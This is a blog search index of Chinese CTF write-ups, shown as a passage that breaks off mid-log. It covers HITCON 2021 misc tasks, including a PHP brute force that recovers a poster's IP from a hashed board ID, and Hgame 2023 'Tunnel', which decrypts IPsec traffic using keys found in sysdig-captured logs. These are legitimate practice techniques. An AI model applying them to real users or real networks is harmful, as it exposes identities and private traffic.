<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HITCON 2021 Misc Writeup</title>
    <url>/2021/12/08/HITCON-2021-Misc-Writeup/</url>
    <content><![CDATA[<h1 id="HITCON-2021-Misc-Writeup"><a href="#HITCON-2021-Misc-Writeup" class="headerlink" title="HITCON 2021 Misc Writeup"></a>HITCON 2021 Misc Writeup</h1><h2 id="FBI-WARNING-orange"><a href="#FBI-WARNING-orange" class="headerlink" title="FBI WARNING(orange)"></a>FBI WARNING(orange)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Please help FBI to arrest Ωrange!</span><br><span class="line">(Flag format: hitcon&#123;&lt;ip-address-of-Ωrange&gt;&#125;)</span><br><span class="line">(Hint: The prefix of the IP address is 219)</span><br><span class="line">http://3.112.91.135/</span><br><span class="line">Author: orange</span><br></pre></td></tr></table></figure>

<p>网站如下:</p>
<p><img src="https://i.imgur.com/RuwxUew.png"></p>
<p>找了找相关的该网站的相关的源码 找到了</p>
<p><a href="https://github.com/futoase/futaba-ng/blob/master/app/dest/futaba.php">https://github.com/futoase/futaba-ng/blob/master/app/dest/futaba.php</a></p>
<p>本题的主要部分</p>
<p><img src="https://i.imgur.com/aKW9ZNv.png"></p>
<p>对应的相关代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;IDSEED&quot;</span>, <span class="string">&#x27;idの種&#x27;</span>);		<span class="comment">//idの種</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c_pass</span> = <span class="variable">$pwd</span>;</span><br><span class="line">  <span class="variable">$pass</span> = (<span class="variable">$pwd</span>) ? <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pwd</span>),<span class="number">2</span>,<span class="number">8</span>) : <span class="string">&quot;*&quot;</span>;</span><br><span class="line">  <span class="variable">$youbi</span> = <span class="keyword">array</span>(<span class="string">&#x27;日&#x27;</span>,<span class="string">&#x27;月&#x27;</span>,<span class="string">&#x27;火&#x27;</span>,<span class="string">&#x27;水&#x27;</span>,<span class="string">&#x27;木&#x27;</span>,<span class="string">&#x27;金&#x27;</span>,<span class="string">&#x27;土&#x27;</span>);</span><br><span class="line">  <span class="variable">$yd</span> = <span class="variable">$youbi</span>[<span class="title function_ invoke__">gmdate</span>(<span class="string">&quot;w&quot;</span>, <span class="variable">$time</span>+<span class="number">9</span>*<span class="number">60</span>*<span class="number">60</span>)] ;</span><br><span class="line">  <span class="variable">$now</span> = (</span><br><span class="line">    <span class="title function_ invoke__">gmdate</span>(<span class="string">&quot;y/m/d&quot;</span>,<span class="variable">$time</span>+<span class="number">9</span>*<span class="number">60</span>*<span class="number">60</span>) . </span><br><span class="line">    <span class="string">&quot;(&quot;</span> .(<span class="keyword">string</span>)<span class="variable">$yd</span> . <span class="string">&quot;)&quot;</span> . </span><br><span class="line">    <span class="title function_ invoke__">gmdate</span>(<span class="string">&quot;H:i&quot;</span>,<span class="variable">$time</span>+<span class="number">9</span>*<span class="number">60</span>*<span class="number">60</span>)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(DISP_ID)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$email</span>&amp;&amp;DISP_ID==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="variable">$now</span> .= <span class="string">&quot; ID:???&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$now</span>.=<span class="string">&quot; ID:&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>].IDSEED.<span class="title function_ invoke__">gmdate</span>(<span class="string">&quot;Ymd&quot;</span>, <span class="variable">$time</span>+<span class="number">9</span>*<span class="number">60</span>*<span class="number">60</span>)),<span class="string">&#x27;id&#x27;</span>),-<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>从这里我们可以得知id生成的规则</p>
<p>再加上提示中说ip的前面部分是219</p>
<p>写脚本来解密(by stypr)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">256</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">0</span>;<span class="variable">$k</span>&lt;<span class="number">256</span>;<span class="variable">$k</span>++)&#123;</span><br><span class="line">            <span class="variable">$actual</span> = <span class="string">&quot;219.&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$j</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$k</span>.<span class="string">&quot;idの種&quot;</span>. <span class="string">&quot;20211203&quot;</span>;</span><br><span class="line">            <span class="variable">$val</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$actual</span>), <span class="string">&quot;id&quot;</span>), -<span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$val</span> == <span class="string">&quot;ueyUrcwA&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$actual</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>跑出对应的ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ php a.php</span><br><span class="line">219.91.64.47idの種20211203</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hitcon&#123;219.91.64.47&#125;</span><br></pre></td></tr></table></figure>

<h2 id="baba-is-misc"><a href="#baba-is-misc" class="headerlink" title="baba is misc:"></a>baba is misc:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BABA IS MISC</span><br><span class="line">MISC HAS FLAG</span><br><span class="line">FLAG HAS WORD AND SPACE</span><br><span class="line">FLAG IS WIN</span><br><span class="line">baba_is_misc-b6a43cc8b24d3cc1592077f68d5089c0491b6021.bin</span><br><span class="line">Author: ddaa</span><br><span class="line"></span><br><span class="line">hint:</span><br><span class="line">The flag prefix `hitcon&#123;` is lower case. The other words in flag content are uppercase.</span><br></pre></td></tr></table></figure>

<p>下载下来发现是个pfs0文件 挂载后发现是一个baba is you的游戏</p>
<p>用<a href="https://github.com/jakcron/nstool">https://github.com/jakcron/nstool</a> 进行分离 分离出program.nca的主程序</p>
<p>再使用<a href="https://github.com/SciresM/hactool">https://github.com/SciresM/hactool</a> 分离相关的文件 可以分离出相关的配置与Lua文件</p>
<p>然后发现大部分是原始的游戏资源,但是玩通关也没有flag</p>
<p>第0关的标题是 <code>find all flag in maps</code></p>
<p><img src="https://i.imgur.com/bGQlHnB.png"></p>
<p>且同时告诉了我们第一部分flag的信息是<code>hitcon&#123;</code></p>
<p><img src="https://i.imgur.com/jXs9Wdz.png"></p>
<p>之后通过下载steam上原始的baba is you文件 然后与题目的资源进行diff</p>
<p>发现level<code>0 17 21 80 82 101 111 130 176</code>的地图与之前存在改变</p>
<p>这就意味着这些地图内可能存在的相关flag的信息</p>
<p>使用<a href="https://github.com/ShootMe/BabaIsYouEditor">https://github.com/ShootMe/BabaIsYouEditor</a> 解析地图</p>
<p>level0: <code>hitcon&#123;</code></p>
<p><img src="https://i.imgur.com/8BJ7q4w.png"></p>
<p>level17: <code>BABA IS YOU</code></p>
<p><img src="https://i.imgur.com/GLMF2jt.png"></p>
<p>level21: <code>IS A</code></p>
<p><img src="https://i.imgur.com/yUpGsKs.png"></p>
<p>level80: <code>GOOD</code></p>
<p><img src="https://i.imgur.com/YKRWI7S.png"></p>
<p>level82: <code>GAME</code></p>
<p><img src="https://i.imgur.com/yd9Qpjb.png"></p>
<p>level101:<code>BUT</code></p>
<p><img src="https://i.imgur.com/WhqqcXl.png"></p>
<p>level111: <code>TOO</code></p>
<p><img src="https://i.imgur.com/CTk53f1.png"></p>
<p>level130: <code>DIFFICULT</code></p>
<p><img src="https://i.imgur.com/9sQocr4.png"></p>
<p>level176: <code>!!!!!!&#125;</code></p>
<p><img src="https://i.imgur.com/OW5nxZL.png"></p>
<p>当然这当时的!是猜出来 后来看discord上讨论需要安装最新的游戏扩展</p>
<p><img src="https://i.imgur.com/NoiaeDC.png"></p>
<p>看来我运气还是不错</p>
<p>最后总结得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000 -&gt; hitcon&#123;</span><br><span class="line">017 -&gt; BABA IS OOU</span><br><span class="line">021 -&gt; IS A</span><br><span class="line">080 -&gt; GOOD</span><br><span class="line">082 -&gt; GAME</span><br><span class="line">101 -&gt; BUT</span><br><span class="line">111 -&gt; TOO</span><br><span class="line">130 -&gt; DIFFICULT</span><br><span class="line">176 -&gt; !!!!!!!&#125;</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hitcon&#123;BABA IS YOU IS A GOOD GAME BUT TOO DIFFICULT !!!!!!&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Misc</tag>
        <tag>CTF</tag>
        <tag>BABA IS YOU</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(CN)</title>
    <url>/2023/01/31/Hgame-2023-week3-Tunnel-&amp;&amp;-Tunnel-Revenge-Writeup-CN/</url>
    <content><![CDATA[<h1 id="Hgame-2023-week3-Tunnel-amp-amp-Tunnel-Revenge-Writeup-CN"><a href="#Hgame-2023-week3-Tunnel-amp-amp-Tunnel-Revenge-Writeup-CN" class="headerlink" title="Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(CN):"></a>Hgame 2023 week3 - Tunnel &amp;&amp; Tunnel Revenge Writeup(CN):</h1><p>大年初三没啥事,基本上都拜完了,开始正常的工作和学习了.正好Hgame 2023的week3开了.有一个misc题.朋友跟我说蛮有意思的,我就来看看.然后顺利拿到了一血.以下是解题思路</p>
<h2 id="Tunnel"><a href="#Tunnel" class="headerlink" title="Tunnel:"></a>Tunnel:</h2><p>有非预期捏</p>
<p>直接strings | grep hgame就出了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crazyman@ubuntu:~/Desktop$ strings tunnel.pcapng | grep hgame</span><br><span class="line">hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</span><br><span class="line">hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</span><br><span class="line">hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</span><br><span class="line">hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</span><br></pre></td></tr></table></figure>

<p>flag是–&gt; <code>hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</code></p>
<h2 id="Tunnel-Revenge："><a href="#Tunnel-Revenge：" class="headerlink" title="Tunnel Revenge："></a>Tunnel Revenge：</h2><p>Revenge版本给非预期的strings修了</p>
<h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP:"></a>TFTP:</h3><p>首先打开流量我们可以观察到有大量的TFTP</p>
<p><img src="https://i.imgur.com/WZHGjvM.png"></p>
<p>通过导出对象可以提取出相关的TFTP内容</p>
<p><img src="https://i.imgur.com/4OpwnUg.png"></p>
<p><img src="https://i.imgur.com/YfAeWky.png"></p>
<p>提取出了charon.scap文件,然后scap文件用wireshark打开发现其是sysdig Event</p>
<p><img src="https://i.imgur.com/XQenZtr.png"></p>
<h3 id="sysdig"><a href="#sysdig" class="headerlink" title="sysdig:"></a>sysdig:</h3><p>看到sysdig的话,如果做题多的同学可以联想到去年的bytectf的一个题目<code>find_it</code>.</p>
<p><a href="https://bytedance.feishu.cn/docx/doxcnWmtkIItrGokckfo1puBtCh">https://bytedance.feishu.cn/docx/doxcnWmtkIItrGokckfo1puBtCh</a></p>
<p>可以参考一下writeup,然后安装sysdig</p>
<p><a href="https://github.com/annulen/sysdig-wiki/blob/master/How-to-Install-Sysdig-for-Linux.md">https://github.com/annulen/sysdig-wiki/blob/master/How-to-Install-Sysdig-for-Linux.md</a></p>
<p>可参考上述链接</p>
<p>我使用的方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -s https://s3.amazonaws.com/download.draios.com/DRAIOS-GPG-KEY.public | sudo apt-key add -  </span><br><span class="line">curl -s -o /etc/apt/sources.list.d/draios.list http://download.draios.com/stable/deb/draios.list  </span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get -y install linux-headers-$(uname -r)</span><br><span class="line">sudo apt-get -y install sysdig</span><br></pre></td></tr></table></figure>

<p>安装成功后我们可以配合<code>chisels</code>进行分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crazyman@ubuntu:~/Desktop$ sudo sysdig -cl</span><br><span class="line"></span><br><span class="line">Category: Application</span><br><span class="line">---------------------</span><br><span class="line">httplog         HTTP requests log</span><br><span class="line">httptop         Top HTTP requests</span><br><span class="line">memcachelog     memcached requests log</span><br><span class="line"></span><br><span class="line">Category: CPU Usage</span><br><span class="line">-------------------</span><br><span class="line">spectrogram     Visualize OS latency in real time.</span><br><span class="line">subsecoffset    Visualize subsecond offset execution time.</span><br><span class="line">topcontainers_cpu</span><br><span class="line">                Top containers by CPU usage</span><br><span class="line">topprocs_cpu    Top processes by CPU usage</span><br><span class="line"></span><br><span class="line">Category: Errors</span><br><span class="line">----------------</span><br><span class="line">topcontainers_error</span><br><span class="line">                Top containers by number of errors</span><br><span class="line">topfiles_errors Top files by number of errors</span><br><span class="line">topprocs_errors top processes by number of errors</span><br><span class="line"></span><br><span class="line">Category: I/O</span><br><span class="line">-------------</span><br><span class="line">echo_fds        Print the data read and written by processes.</span><br><span class="line">fdbytes_by      I/O bytes, aggregated by an arbitrary filter field</span><br><span class="line">fdcount_by      FD count, aggregated by an arbitrary filter field</span><br><span class="line">fdtime_by       FD time group by</span><br><span class="line">iobytes         Sum of I/O bytes on any type of FD</span><br><span class="line">iobytes_file    Sum of file I/O bytes</span><br><span class="line">spy_file        Echo any read/write made by any process to all files. Optionall</span><br><span class="line">                y, you can provide the name of one file to only intercept reads</span><br><span class="line">                /writes to that file.</span><br><span class="line">stderr          Print stderr of processes</span><br><span class="line">stdin           Print stdin of processes</span><br><span class="line">stdout          Print stdout of processes</span><br><span class="line">topcontainers_file</span><br><span class="line">                Top containers by R+W disk bytes</span><br><span class="line">topfiles_bytes  Top files by R+W bytes</span><br><span class="line">topfiles_time   Top files by time</span><br><span class="line">topprocs_file   Top processes by R+W disk bytes</span><br><span class="line">udp_extract     extract data from UDP streams to files.</span><br><span class="line"></span><br><span class="line">Category: Logs</span><br><span class="line">--------------</span><br><span class="line">spy_logs        Echo any write made by any process to a log file. Optionally, e</span><br><span class="line">                xport the events around each log message to file.</span><br><span class="line">spy_syslog      Print every message written to syslog. Optionally, export the e</span><br><span class="line">                vents around each syslog message to file.</span><br><span class="line"></span><br><span class="line">Category: Misc</span><br><span class="line">--------------</span><br><span class="line">around          Export to file the events around the time range where the given</span><br><span class="line">                 filter matches.</span><br><span class="line"></span><br><span class="line">Category: Net</span><br><span class="line">-------------</span><br><span class="line">iobytes_net     Show total network I/O bytes</span><br><span class="line">spy_ip          Show the data exchanged with the given IP address</span><br><span class="line">spy_port        Show the data exchanged using the given IP port number</span><br><span class="line">topconns        Top network connections by total bytes</span><br><span class="line">topcontainers_net</span><br><span class="line">                Top containers by network I/O</span><br><span class="line">topports_server Top TCP/UDP server ports by R+W bytes</span><br><span class="line">topprocs_net    Top processes by network I/O</span><br><span class="line"></span><br><span class="line">Category: Performance</span><br><span class="line">---------------------</span><br><span class="line">bottlenecks     Slowest system calls</span><br><span class="line">fileslower      Trace slow file I/O</span><br><span class="line">netlower        Trace slow network I/0</span><br><span class="line">proc_exec_time  Show process execution time</span><br><span class="line">scallslower     Trace slow syscalls</span><br><span class="line">topscalls       Top system calls by number of calls</span><br><span class="line">topscalls_time  Top system calls by time</span><br><span class="line"></span><br><span class="line">Category: Security</span><br><span class="line">------------------</span><br><span class="line">list_login_shells</span><br><span class="line">                List the login shell IDs</span><br><span class="line">shellshock_detect</span><br><span class="line">                print shellshock attacks</span><br><span class="line">spy_users       Display interactive user activity</span><br><span class="line"></span><br><span class="line">Category: System State</span><br><span class="line">----------------------</span><br><span class="line">lscontainers    List the running containers</span><br><span class="line">lsof            List (and optionally filter) the open file descriptors.</span><br><span class="line">netstat         List (and optionally filter) network connections.</span><br><span class="line">ps              List (and optionally filter) the machine processes.</span><br><span class="line"></span><br><span class="line">Category: Tracers</span><br><span class="line">-----------------</span><br><span class="line">tracers_2_statsd</span><br><span class="line">                Export spans duration as statds metrics.</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>可以先将<code>echo_fds</code>搞出来看看有什么东西</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sysdig -r charon.scap -A -c echo_fds</span><br></pre></td></tr></table></figure>

<p>可以将内容保存到一个文件中再进行分析</p>
<p>首先我们可以搜到一些命令行的历史记录<code>/root/.zsh_history</code></p>
<p><img src="https://i.imgur.com/D3pRbww.png"></p>
<p>其中第一,二部分是一些环境的安装以及安装sysdig</p>
<p>可以搜索一下文件名定位到一些比较关键的地方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[31m------ Read 1.30KB from  [31m /root/.zsh_history (zsh)</span><br><span class="line"></span><br><span class="line">y_logs -w 233.scap</span><br><span class="line">: 1674489646:0;systemctl start ipsec</span><br><span class="line">: 1674489657:0;systemctl stop ipsec</span><br><span class="line">: 1674489659:0;nano /etc/ipsec.conf</span><br><span class="line">: 1674489672:0;sysdig -C 100 -W 1 -c spy_logs -w 233.scap</span><br><span class="line">: 1674489696:0;systemctl start ipsec</span><br><span class="line">: 1674489725:0;systemctl stop ipsec</span><br><span class="line">: 1674489793:0;sysdig -C 100 -W 1 -c spy_logs -w 233.scap</span><br><span class="line">: 1674489796:0;systemctl start ipsec</span><br><span class="line">: 1674489814:0;nc -ulvvp 3939</span><br><span class="line">: 1674489894:0;nano /etc/ipsec.conf</span><br><span class="line">: 1674489968:0;systemctl restart ipsec</span><br><span class="line">: 1674489972:0;nc -ulvvp 3939</span><br><span class="line">: 1674490131:0;sysdig -C 100 -W 1 -c spy_logs -w 233.scap</span><br><span class="line">: 1674490142:0;systemctl stop ipsec</span><br><span class="line">: 1674490155:0;sysdig -C 100 -W 1 -c spy_logs -w 233.scap</span><br><span class="line">: 1674490160:0;systemctl start ipsec</span><br><span class="line">: 1674490234:0;mv 233.scap0 ipsec.scap</span><br><span class="line">: 1674490246:0;mv ipsec.scap charon.scap</span><br><span class="line">: 1674490254:0;atftp 192.168.138.128</span><br><span class="line">: 1674490293:0;ip xfrm stat</span><br><span class="line">: 1674490298:0;systemctl stop ipsec</span><br><span class="line">: 1674490456:0;md5sum charon.scap</span><br><span class="line">: 1674490459:0;md5sum charon_asd.scap</span><br><span class="line">: 1674490505:0;sysdig -r charon_asd.scap -c spy_logs &gt; a.txt</span><br><span class="line">: 1674492979:0;ifconfig</span><br><span class="line">: 1674492985:0;ifconfig enp2s1 up</span><br><span class="line">: 1674492988:0;dhclient</span><br><span class="line">: 1674492990:0;ifconfig</span><br><span class="line">: 1674493027:0;systemctl stop ipsec</span><br><span class="line">: 1674493029:0;nano /etc/ipsec.conf</span><br><span class="line">: 1674493072:0;systemctl start ipsec</span><br><span class="line">: 1674493232:0;nc -ulvvp 3939</span><br><span class="line">: 1674493542:0;systemctl stop ipsec</span><br><span class="line">: 1674493562:0;sysdig -C 100 -W 1 -c spy_logs -w 233.scap</span><br></pre></td></tr></table></figure>

<p>比较关键的一些信息<code>sysdig -r charon_asd.scap -c spy_logs</code>,<code>nc -ulvvp 3939</code>,<code>nano /etc/ipsec.conf</code></p>
<p>然后我们可以得知接受的端口是3939 然后可以用sysdig的spy_logs来进行数据的提取,还有一个文件ipsec.conf,我们先搜搜这个文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[31m------ Read 847B from  [31m /etc/ipsec.conf (starter)</span><br><span class="line"></span><br><span class="line"># ipsec.conf - strongSwan IPsec configuration file</span><br><span class="line"></span><br><span class="line"># basic configuration</span><br><span class="line"></span><br><span class="line">config setup</span><br><span class="line"># strictcrlpolicy=yes</span><br><span class="line"># uniqueids = no</span><br><span class="line"></span><br><span class="line"># Add connections here.</span><br><span class="line"></span><br><span class="line"># Sample VPN connections</span><br><span class="line"></span><br><span class="line">#conn sample-self-signed</span><br><span class="line">#      leftsubnet=10.1.0.0/16</span><br><span class="line">#      leftcert=selfCert.der</span><br><span class="line">#      leftsendcert=never</span><br><span class="line">#      right=192.168.0.2</span><br><span class="line">#      rightsubnet=10.2.0.0/16</span><br><span class="line">#      rightcert=peerCert.der</span><br><span class="line">#      auto=start</span><br><span class="line"></span><br><span class="line">#conn sample-with-ca-cert</span><br><span class="line">#      leftsubnet=10.1.0.0/16</span><br><span class="line">#      leftcert=myCert.pem</span><br><span class="line">#      right=192.168.0.2</span><br><span class="line">#      rightsubnet=10.2.0.0/16</span><br><span class="line">#      rightid=&quot;C=CH, O=Linux strongSwan CN=peer name&quot;</span><br><span class="line">#      auto=start</span><br><span class="line">conn test</span><br><span class="line">    authby=secret</span><br><span class="line">    auto=start</span><br><span class="line">    keyexchange=ikev1</span><br><span class="line">    ike=aes128-sha1-modp1024!</span><br><span class="line">    esp=aes128-sha1!</span><br><span class="line">    left=192.168.138.132</span><br><span class="line">    right=192.168.138.128</span><br><span class="line">    type=transport</span><br><span class="line">    leftprotoport=17/3939</span><br><span class="line">    rightprotoport=17/3939</span><br></pre></td></tr></table></figure>

<p>可以看到最后的部分是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conn test</span><br><span class="line">    authby=secret</span><br><span class="line">    auto=start</span><br><span class="line">    keyexchange=ikev1</span><br><span class="line">    ike=aes128-sha1-modp1024!</span><br><span class="line">    esp=aes128-sha1!</span><br><span class="line">    left=192.168.138.132</span><br><span class="line">    right=192.168.138.128</span><br><span class="line">    type=transport</span><br><span class="line">    leftprotoport=17/3939</span><br><span class="line">    rightprotoport=17/3939</span><br></pre></td></tr></table></figure>

<p>同时我们可以用命令提取<code>spy_logs</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sysdig -r charon.scap -c spy_logs</span><br></pre></td></tr></table></figure>

<p>再将其保存到文件里进行分析</p>
<p>然后我们可以看到<code>keyexchange=ikev1</code>以及流量包里的<code>ISAKMP</code>和<code>ESP</code>协议后经过搜索可以发现这篇文章<br><a href="https://celaldogan2010.medium.com/decrypting-ipsec-protocols-isakmp-and-esp-with-wireshark-d484a5a93991">https://celaldogan2010.medium.com/decrypting-ipsec-protocols-isakmp-and-esp-with-wireshark-d484a5a93991</a></p>
<p><img src="https://i.imgur.com/o8b2MgN.png"></p>
<p>通过阅读博文发现其完全符合我们目前所知的所有情况,其主要使用了IPSec协议(具体是用了Strongswan的进行实现),<code>/etc/ipsec.conf </code>是Strongswan的相关配置,通过对其的配置我们也可以找到<code>/etc/strongswan.conf</code>,不过我们找不到<code>charon.log</code> 和 <code>/etc/ipsec.secrets</code></p>
<p><code>/etc/strongswan.conf</code>内容:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[31m------ Read 369B from  [31m /etc/strongswan.conf (starter)</span><br><span class="line"></span><br><span class="line"># strongswan.conf - strongSwan configuration file</span><br><span class="line">#</span><br><span class="line"># Refer to the strongswan.conf(5) manpage for details</span><br><span class="line">#</span><br><span class="line"># Configuration changes should be made in the included files</span><br><span class="line"></span><br><span class="line">charon &#123;</span><br><span class="line">load_modular = yes</span><br><span class="line">syslog &#123;</span><br><span class="line">identifier = charon</span><br><span class="line">default = 4</span><br><span class="line">auth &#123;</span><br><span class="line">default = 4</span><br><span class="line">ike = 4</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">plugins &#123;</span><br><span class="line">include strongswan.d/charon/*.conf</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不过用处没有那么大,只是用来串联题目的路径</p>
<p>由于IPSec是由ISAKMP和ESP组成,我们先解密<code>ISAKMP</code>部分</p>
<h3 id="ISAKMP"><a href="#ISAKMP" class="headerlink" title="ISAKMP:"></a>ISAKMP:</h3><p>通过这篇文章的<code>Step 4 Acquiring ICOOKIE (Initiator SPI) and the encryption key from log file (charon.log) for ISAKMP</code>我们先去解密<code>ISAKMP</code></p>
<p>在<code>echo_fds</code>里搜索<code>checkout</code> 拿到 Initiator’s COOKIE –&gt; <code>620270aca82ca7ad</code></p>
<p><img src="https://i.imgur.com/Qi7VSLU.png"></p>
<p>在<code>spy_logs</code>里搜索<code>encryption key</code>拿到 Encryption key –&gt; <code>99EF15AC696A5CC9442E8A8A54038674</code></p>
<p><img src="https://i.imgur.com/GnuLoy1.png"></p>
<p>之后导入wireshark,编辑-首选项-Protocols-ISAKMP-IKEv1 Decryption Table</p>
<p><img src="https://i.imgur.com/4YYJyti.png"></p>
<p>将上文所提到的Initiator’s COOKIE和Encryption key填入</p>
<p><img src="https://i.imgur.com/o1kloZq.png"></p>
<p>导入之前:</p>
<p><img src="https://i.imgur.com/AABV8x5.png"></p>
<p>导入之后:</p>
<p><img src="https://i.imgur.com/Gqohqiv.png"></p>
<p>可以发现已经可以成功解析</p>
<p>不过还是没有flag,发现我们还没有解密<code>ESP</code>,所以下一步我们需要解密<code>ESP</code>来进行后续的步骤</p>
<p><img src="https://i.imgur.com/pH2YikC.png"></p>
<h3 id="ESP"><a href="#ESP" class="headerlink" title="ESP:"></a>ESP:</h3><p>通过文章的<code>Step 5 Acquiring authentication, encryption keys and algorithms for ESP</code>我们知道如果需要解密<code>ESP</code>协议需要先找到<code>SPI</code>,<code>authentication and encryption keys</code>以及其加密验证方式</p>
<p>SPI可以通过流量以获得其是<code>0xcefea138</code></p>
<p><img src="https://i.imgur.com/gL2pXd9.png"></p>
<p>在<code>spy_logs</code>里搜索<code>0xcefea138</code>可以定位到相关的log:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CFG] received proposals: ESP:AES_CBC_128/HMAC_SHA1_96/NO_EXT_SEQ</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CFG] configured proposals: ESP:AES_CBC_128/HMAC_SHA1_96/NO_EXT_SEQ</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CFG] selected proposal: ESP:AES_CBC_128/HMAC_SHA1_96/NO_EXT_SEQ</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] CHILD_SA test&#123;1&#125; state change: CREATED =&gt; INSTALLING</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   using AES_CBC for encryption</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   using HMAC_SHA1_96 for integrity</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] initiator SA seed =&gt; 69 bytes @ 0x7f86fe2faa20</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]    0: 03 47 74 5E 89 A4 B4 A2 68 5F A7 9A B2 56 8D 43  .Gt^....h_...V.C</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   16: AA 70 32 8A D1 B5 E2 26 C0 63 7A C7 B4 B6 BC DD  .p2....&amp;.cz.....</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   32: 57 65 07 76 08 9E FC B8 5F EE B1 1F D9 A1 62 8D  We.v...._.....b.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   48: 87 BB FF 75 A0 1A 96 35 42 80 63 99 95 D9 04 27  ...u...5B.c....&#x27;</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   64: 23 FC 0D 58 A0                                   #..X.</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD] responder SA seed =&gt; 69 bytes @ 0x7f86fe2fa9d0</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]    0: 03 CE FE A1 38 A4 B4 A2 68 5F A7 9A B2 56 8D 43  ....8...h_...V.C</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   16: AA 70 32 8A D1 B5 E2 26 C0 63 7A C7 B4 B6 BC DD  .p2....&amp;.cz.....</span><br><span class="line">rs:main /var/log/auth.log Jan 24 01:06:05 debian charon: 13[CHD]   32: 57 65 07 76 08 9E 